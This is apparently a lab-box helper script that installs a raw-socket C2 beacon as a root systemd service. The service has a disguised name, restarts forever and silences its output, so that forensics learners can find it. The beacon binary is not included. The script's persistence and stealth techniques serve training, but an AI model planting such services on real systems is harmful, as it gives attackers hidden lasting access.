name: realm-beacon
description: Practice-box helper: installs a compiled raw-socket C2 beacon (codename DISASTEROUS_PHARMACY; the unmodified rawsockets-beacon test tool from rawsockets-beacon-iptablesavoider-deepseek) as a root systemd service with a bland, slightly-sketchy unit name. Unlike raw-socket-beacon, the C2 destination is passed at RUNTIME (-t/-p), so the planted cmdline leaks the target to anyone who reviews processes or the unit file -- finding it is the exercise. Default target 10.233.0.66:8443 every 30s forever (RFC 1918, unreachable from practice networks); the beacon LISTENS ON NO PORT and the unit silences the journal. Vars: SERVICE_NAME (required), BEACON_PATH (default /opt/tide-sync/tide-syncd), DESCRIPTION, TARGET_IP, TARGET_PORT, INTERVAL_S, BEACON_ID (default DISASTEROUS_PHARMACY).
script:
#!/bin/sh
# realm-beacon -- plants the DISASTEROUS_PHARMACY raw-socket C2 beacon as a
# root systemd service under a bland, slightly-sketchy name. Unlike
# raw-socket-beacon (whose C2 is compiled in), this beacon takes its target as
# RUNTIME FLAGS, so the planted unit's ExecStart leaks the full story to anyone
# who reads `ps aux` or `systemctl cat` -- finding that is the exercise. The
# beacon LISTENS ON NO PORT (raw-socket SYN forger), the journal is silenced,
# and the default C2 is an RFC 1918 address that is unreachable from the box's
# network, so the traffic dies upstream without touching real infrastructure.
# Requires root (CAP_NET_RAW for the raw socket -- the unit runs as root).
#
# Vars: SERVICE_NAME (required, no .service suffix); BEACON_PATH (optional,
# default /opt/tide-sync/tide-syncd -- if you override it, update the paired
# process_state pattern in the box's scenario.yaml); DESCRIPTION (optional);
# TARGET_IP/TARGET_PORT (optional; defaults are the forensics answer);
# INTERVAL_S (optional, default 30); BEACON_ID (optional, default
# DISASTEROUS_PHARMACY). Idempotent: re-running reinstalls binary and unit.
set -eu

: "${SERVICE_NAME:?SERVICE_NAME is required}"
BEACON_PATH="${BEACON_PATH:-/opt/tide-sync/tide-syncd}"
DESCRIPTION="${DESCRIPTION:-Tide table sync service}"
TARGET_IP="${TARGET_IP:-10.233.0.66}"
TARGET_PORT="${TARGET_PORT:-8443}"
INTERVAL_S="${INTERVAL_S:-30}"
BEACON_ID="${BEACON_ID:-DISASTEROUS_PHARMACY}"

_B64=''

tmp=$(mktemp)
trap 'rm -f "$tmp"' EXIT
printf '%s' "$_B64" | base64 -d > "$tmp"
install -d -m 0755 "$(dirname -- "$BEACON_PATH")"
install -m 0755 "$tmp" "$BEACON_PATH"

unit="/etc/systemd/system/${SERVICE_NAME}.service"
{
    printf '%s\n' '[Unit]'
    printf 'Description=%s\n' "$DESCRIPTION"
    printf '%s\n\n' 'After=network.target'
    printf '%s\n' '[Service]'
    printf '%s\n' 'Type=simple'
    printf 'ExecStart=%s -t %s -p %s -i %s -n 0 -b %s\n' "$BEACON_PATH" "$TARGET_IP" "$TARGET_PORT" "$INTERVAL_S" "$BEACON_ID"
    printf '%s\n' 'Restart=always'
    printf '%s\n' 'StandardOutput=null'
    printf '%s\n' 'StandardError=null'
    printf '%s\n\n' '[Install]'
    printf '%s\n' 'WantedBy=multi-user.target'
} > "$unit"
chmod 0644 "$unit"

if command -v systemctl >/dev/null 2>&1; then
    systemctl daemon-reload
    systemctl enable --now "${SERVICE_NAME}.service"
fi
